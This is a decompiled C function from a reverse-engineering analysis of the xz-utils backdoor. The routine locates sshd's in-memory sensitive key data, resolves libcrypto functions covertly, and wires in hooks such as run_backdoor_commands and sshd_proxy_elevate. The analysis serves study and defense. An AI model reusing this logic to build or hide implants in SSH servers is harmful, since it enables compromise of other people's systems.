// /home/kali/xzre-ghidra/xzregh/105410_sshd_find_sensitive_data.c
// Function: sshd_find_sensitive_data @ 0x105410
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_sensitive_data(elf_info_t * sshd, elf_info_t * libcrypto, string_references_t * refs, imported_funcs_t * funcs, global_context_t * ctx)


/*
 * AutoDoc: Bootstraps the entire sensitive-data pipeline: it appends bookkeeping entries for `sshd_proxy_elevate`/socket helpers
 * into the secret-data log, uses the fake lzma allocator (pointed at libcrypto) to resolve `EVP_PKEY_new_raw_public_key`,
 * `EVP_Digest`, `EVP_DigestVerify`, `EVP_DigestVerifyInit`, `EVP_CIPHER_CTX_new`, `EVP_chacha20`, and sanity-checks that
 * the library exports the `EVP_sm*` family the payload expects. It locates sshd's code/data segments, finds the real
 * `sshd_main` entry (recording whether an ENDBR64 prefix is present), and runs both the xcalloc-based and `KRB5CCNAME`
 * heuristics to recover candidate struct addresses. Each candidate is scored via `sshd_get_sensitive_data_score`, and
 * whichever pointer clears the >=8 threshold is stored in `ctx->sshd_sensitive_data`; on failure all of the just-resolved
 * libcrypto stubs are freed before the helper reports that no recon data was found.
 */

#include "xzre_types.h"

BOOL sshd_find_sensitive_data
               (elf_info_t *sshd,elf_info_t *libcrypto,string_references_t *refs,
               imported_funcs_t *funcs,global_context_t *ctx)

{
  Elf64_Addr EVar1;
  Elf64_Ehdr *pEVar2;
  u64 uVar3;
  u64 uVar4;
  u8 *code_start;
  u8 *code_segment_end;
  BOOL BVar6;
  BOOL BVar7;
  uint uVar8;
  uint uVar9;
  lzma_allocator *allocator;
  pfn_EVP_DigestVerifyInit_t ppVar10;
  void *pvVar11;
  Elf64_Sym *pEVar12;
  Elf64_Sym *pEVar13;
  u8 *data_start;
  pfn_EVP_CIPHER_CTX_new_t ppVar14;
  pfn_EVP_chacha20_t ppVar15;
  long lVar16;
  secret_data_item_t *psVar17;
  sensitive_data *psVar18;
  byte bVar19;
  u64 code_segment_size;
  u64 data_segment_size;
  u8 *sshd_main_addr;
  u8 *code_scan_limit;
  sensitive_data *krb_candidate_local;
  sensitive_data *xzcalloc_candidate_local;
  secret_data_item_t secret_probe_items;
  code *run_backdoor_entry;
  u64 run_backdoor_descriptor;
  u64 usable_socket_descriptor;
  code *usable_socket_entry;
  u64 usable_socket_opcode;
  u64 client_socket_descriptor;
  code *client_socket_entry;
  u64 client_socket_opcode;
  u64 client_socket_flags;
  
  bVar19 = 0;
  BVar6 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x1c8,0,0x1d);
  if (BVar6 == FALSE) {
    return FALSE;
  }
  run_backdoor_descriptor = 0x1b000001c8;
  secret_probe_items.anchor_pc = (u8 *)sshd_proxy_elevate;
  secret_probe_items.bit_cursor = (secret_data_shift_cursor_t)0x1c8;
  secret_probe_items.operation_slot = 0x1c;
  run_backdoor_entry = run_backdoor_commands;
  secret_probe_items.bits_to_shift = 0;
  secret_probe_items.ordinal = 1;
  usable_socket_descriptor = 0x100000000;
  usable_socket_entry = sshd_get_usable_socket;
  usable_socket_opcode = 0x1a000001c3;
  client_socket_descriptor = 0x100000005;
  client_socket_entry = sshd_get_client_socket;
  client_socket_opcode = 0x19000001bd;
  client_socket_flags = 0x100000006;
  BVar6 = secret_data_append_items(&secret_probe_items,4,secret_data_append_item);
  if (BVar6 == FALSE) {
    return FALSE;
  }
  psVar17 = &secret_probe_items;
  for (lVar16 = 0x18; lVar16 != 0; lVar16 = lVar16 + -1) {
    *(undefined4 *)&psVar17->anchor_pc = 0;
    psVar17 = (secret_data_item_t *)((long)psVar17 + (ulong)bVar19 * -8 + 4);
  }
  code_segment_size = 0;
  data_segment_size = 0;
  sshd_main_addr = (u8 *)0x0;
  code_scan_limit = (u8 *)0x0;
  krb_candidate_local = (sensitive_data *)0x0;
  xzcalloc_candidate_local = (sensitive_data *)0x0;
  allocator = get_lzma_allocator();
  allocator->opaque = libcrypto;
  ppVar10 = (pfn_EVP_DigestVerifyInit_t)lzma_alloc(0x118,allocator);
  funcs->EVP_DigestVerifyInit = ppVar10;
  if (ppVar10 != (pfn_EVP_DigestVerifyInit_t)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  pvVar11 = elf_get_code_segment(sshd,&code_segment_size);
  uVar3 = code_segment_size;
  if (pvVar11 == (void *)0x0) {
    return FALSE;
  }
  pEVar12 = elf_symbol_get(libcrypto,STR_EVP_DigestVerify,0);
  pEVar13 = elf_symbol_get(libcrypto,STR_EVP_sm,0);
  if (pEVar13 == (Elf64_Sym *)0x0) {
    return FALSE;
  }
  data_start = (u8 *)elf_get_data_segment(sshd,&data_segment_size,FALSE);
  uVar4 = data_segment_size;
  if (data_start == (u8 *)0x0) {
    return FALSE;
  }
  if (pEVar12 != (Elf64_Sym *)0x0) {
    EVar1 = pEVar12->st_value;
    pEVar2 = libcrypto->elfbase;
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
    funcs->EVP_DigestVerify = (pfn_EVP_DigestVerify_t)(pEVar2->e_ident + EVar1);
  }
  ppVar14 = (pfn_EVP_CIPHER_CTX_new_t)lzma_alloc(0x838,allocator);
  funcs->EVP_CIPHER_CTX_new = ppVar14;
  if (ppVar14 != (pfn_EVP_CIPHER_CTX_new_t)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  BVar6 = sshd_find_main(&sshd_main_addr,sshd,libcrypto,funcs);
  code_start = sshd_main_addr;
  if (BVar6 == FALSE) {
    return FALSE;
  }
  ctx->sshd_main_entry = sshd_main_addr;
  BVar6 = is_endbr64_instruction(sshd_main_addr,sshd_main_addr + 4,0xe230);
  ctx->uses_endbr64 = (uint)(BVar6 != FALSE);
  code_segment_end = (u8 *)((long)pvVar11 + uVar3);
  if ((BVar6 != FALSE) &&
     (BVar6 = find_function(code_start,(void **)0x0,&code_scan_limit,code_start,
                            (u8 *)((long)pvVar11 + uVar3),FIND_NOP), code_segment_end = code_scan_limit,
     BVar6 == FALSE)) {
    return FALSE;
  }
  code_scan_limit = code_segment_end;
  BVar6 = sshd_get_sensitive_data_address_via_xcalloc
                    (data_start,data_start + uVar4,code_start,code_scan_limit,refs,&xzcalloc_candidate_local);
  BVar7 = sshd_get_sensitive_data_address_via_krb5ccname
                    (data_start,data_start + uVar4,code_start,code_scan_limit,&krb_candidate_local,sshd);
  ppVar15 = (pfn_EVP_chacha20_t)lzma_alloc(0xc28,allocator);
  psVar18 = xzcalloc_candidate_local;
  funcs->EVP_chacha20 = ppVar15;
  if (ppVar15 != (pfn_EVP_chacha20_t)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  if (BVar6 == FALSE) {
LAB_00105772:
    if (BVar7 == FALSE) goto LAB_001057d3;
    uVar8 = 0;
LAB_001057a6:
    uVar9 = sshd_get_sensitive_data_score(krb_candidate_local,sshd,refs);
  }
  else {
    if (BVar7 != FALSE) {
      if (xzcalloc_candidate_local == krb_candidate_local) {
        uVar8 = sshd_get_sensitive_data_score(xzcalloc_candidate_local,sshd,refs);
        if (uVar8 < 8) {
          return FALSE;
        }
        goto LAB_0010575e;
      }
      uVar8 = sshd_get_sensitive_data_score(xzcalloc_candidate_local,sshd,refs);
      goto LAB_001057a6;
    }
    if (BVar6 == FALSE) goto LAB_00105772;
    uVar8 = sshd_get_sensitive_data_score(xzcalloc_candidate_local,sshd,refs);
    uVar9 = 0;
  }
  if (((uVar9 <= uVar8) && (psVar18 = xzcalloc_candidate_local, 7 < uVar8)) ||
     ((uVar8 <= uVar9 && (psVar18 = krb_candidate_local, 7 < uVar9)))) {
LAB_0010575e:
    ctx->sshd_sensitive_data = psVar18;
    return TRUE;
  }
LAB_001057d3:
  lzma_free(funcs->EVP_DigestVerifyInit,allocator);
  lzma_free(funcs->EVP_CIPHER_CTX_new,allocator);
  lzma_free(funcs->EVP_chacha20,allocator);
  return FALSE;
}

